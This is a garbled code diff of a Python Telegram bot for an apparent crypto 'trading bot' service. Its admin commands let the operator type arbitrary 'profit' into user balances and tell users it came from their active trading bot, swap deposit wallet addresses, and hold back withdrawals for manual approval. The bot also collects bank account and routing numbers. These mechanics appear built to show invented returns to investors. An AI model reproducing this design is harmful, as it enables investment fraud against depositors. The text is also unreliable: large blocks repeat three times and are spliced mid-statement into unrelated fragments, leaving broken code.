+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(refresh_balance, pattern='^refresh_balance:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(visit_website, pattern='^visit_website:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(handle_deposit, pattern='^deposit:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
